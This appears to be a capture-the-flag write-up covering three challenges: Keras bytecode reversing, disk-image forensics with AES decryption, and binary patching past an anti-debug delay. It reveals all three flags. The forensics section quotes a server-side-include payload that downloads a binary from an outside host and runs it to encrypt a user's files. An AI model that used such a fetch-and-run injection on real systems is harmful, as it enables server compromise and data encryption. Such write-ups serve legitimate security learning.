@@ -1,0 +1,130 @@
+---
+title: "HIB CHB Quals 2026 - AI, Forensics & Reverse Engineering Solutions"
+description: "Detailed breakdown of HIB CHB Quals 2026 covering Keras bytecode deserialization, disk timeline triage with AES-256 decryption, and binary patching with anti-debugging bypass."
+date: 2026-08-11
+event: "Hack It Brawijaya (CHB Quals 2026)"
+category: "reverse"
+difficulty: "hard"
+points: 2864
+tags: ["keras-deserialization", "python-bytecode", "disk-forensics", "anti-debugging", "binary-patching", "aes-cbc"]
+tools: ["H5Web", "Dis", "Marshal", "Autopsy", "Ghidra", "CyberChef", "Python"]
+draft: false
+---
+
+import Callout from '../../components/Callout.astro';
+import FlagReveal from '../../components/islands/FlagReveal';
+
+## 1. Challenge Summary
+
+| Category | Challenge Name | Points | Core Technique |
+| :--- | :--- | :--- | :--- |
+| **AI** | `.h5` | 1,000 PTS | Keras Lambda Layer Deserialization & Bytecode Reversing |
+| **Forensics** | `The Cure` | 864 PTS | EnCase E01 Forensic Timeline Analysis & AES-256 Decryption |
+| **Reverse** | `peekaboo` | 1,000 PTS | Linux Fork/Pipe Anti-Debugging & Sleep Barrier NOP Patching |
+
+---
+
+## 2. AI: `.h5` (1,000 pts)
+
+### Description
+> *An abandoned packet-classification model hides more than weights. Download spectral oracle.h5 and recover the flag from serialized function data. You do not need to execute the model.*
+
+### Analysis & Solution
+Inspecting `oracle.h5` with **H5Web** reveals a custom `Lambda` layer named `latent_manifest` inside the model configuration containing base64-encoded Python marshal bytecode:
+
+```python
+import base64
+import marshal
+import dis
+
+b64_str = "4wIAAAAAAAAAAAAAAAgAAAADAAAB85IAAACHA5cAZAF..."
+code = marshal.loads(base64.b64decode(b64_str))
+dis.dis(code)
+```
+
+Decompiling the bytecode reveals constant tuples `residue` (39 bytes) and `wheel = (67, 33, 167, 92)` with an indexed XOR decryption algorithm:
+
+```text
+char[i] = residue[i] ^ wheel[i % 4] ^ ((i * 19 + 11) & 255)
+```
+
+### Solver Script
+```python
+residue = (
+    0, 118, 212, 91, 92, 9, 232, 250, 155, 250, 90, 242, 153,
+    75, 134, 24, 75, 11, 153, 68, 240, 214, 104, 248, 164, 152,
+    110, 101, 100, 112, 214, 97, 24, 60, 6, 200, 195, 219, 7
+)
+wheel = (67, 33, 167, 92)
+
+flag = []
+for i, n in enumerate(residue):
+    w = wheel[i % len(wheel)]
+    decoded_char = chr(n ^ w ^ ((i * 19 + 11) & 255))
+    flag.append(decoded_char)
+
+print("[+] Decrypted Flag:", "".join(flag))
+```
+
+<Callout type="success" title=".h5 Flag">
+  <FlagReveal flag="HIBCHB26{m4r5h4l3d_l4mbd4_058c4e0c0070}" client:visible />
+</Callout>
+
+---
+
+## 3. Forensics: `The Cure` (864 pts)
+
+### Analysis & Solution
+Given an EnCase image `image.E01` (1.81 GB). Analyzing filesystem artifacts in Autopsy:
+1. Located encrypted file `flag.pdf.enc` under `/home/kiiro/Documents/` created at `2026-07-14 03:39:35 WIB`.
+2. Investigating Web Server access logs and Server-Side Includes (SSI) at `/var/www/30/pwn.shtml` executed at the exact timestamp:
+
+```html
+<!--#exec "wget -O /tmp/poison http://192.168.1.5:9000/poison; chmod +x /tmp/poison; /tmp/poison 45fda028267659abcc7a412ef66d219035d368a5a76ab99747b04a5246481bce /home/kiiro/Documents/; echo 'done'"-->
+```
+
+3. The malware `/tmp/poison` performs AES-256-CBC encryption using the argument key `45fda028267659abcc7a412ef66d219035d368a5a76ab99747b04a5246481bce` where the first 16 bytes of `flag.pdf.enc` serve as the IV.
+
+### Solver Script
+```python
+from Crypto.Cipher import AES
+import binascii
+
+key_hex = "45fda028267659abcc7a412ef66d219035d368a5a76ab99747b04a5246481bce"
+key = binascii.unhexlify(key_hex)
+
+with open('flag.pdf.enc', 'rb') as f:
+    encrypted_data = f.read()
+
+iv = encrypted_data[:16]
+ciphertext = encrypted_data[16:]
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+decrypted_data = cipher.decrypt(ciphertext)
+padding_length = decrypted_data[-1]
+if padding_length <= 16:
+    decrypted_data = decrypted_data[:-padding_length]
+
+with open('flag.pdf', 'wb') as f:
+    f.write(decrypted_data)
+
+print("[+] Decryption complete! Flag extracted from PDF text stream.")
+```
+
+<Callout type="success" title="The Cure Flag">
+  <FlagReveal flag="HIBCHB26{maaf_ya_for_everything_that_i've_done_36c660c50c84a15f}" client:visible />
+</Callout>
+
+---
+
+## 4. Reverse: `peekaboo` (1,000 pts)
+
+### Analysis & Solution
+1. The ELF binary runs a parent-child architecture using `fork()` and bi-directional pipes for IPC.
+2. The child process inspects parent tracing and responds with byte `'K'` under unmonitored conditions.
+3. However, execution hangs in `sync_barrier()` -> `barrier_tick()` which calls `poll()` with a delay of `0x7530` ms (30 seconds per iteration) across 37 iterations.
+4. **Binary Patch:** By replacing the 5-byte `CALL sync_barrier` instruction in the binary with 5 `NOP` (`0x90`) instructions, the execution immediately flows into `unwrap_flag()`, printing the decrypted flag without delays.
+
+<Callout type="success" title="peekaboo Flag">
+  <FlagReveal flag="HIBCHB26{peekab00_i_s33_you_6sg82yh6}" client:visible />
+</Callout>
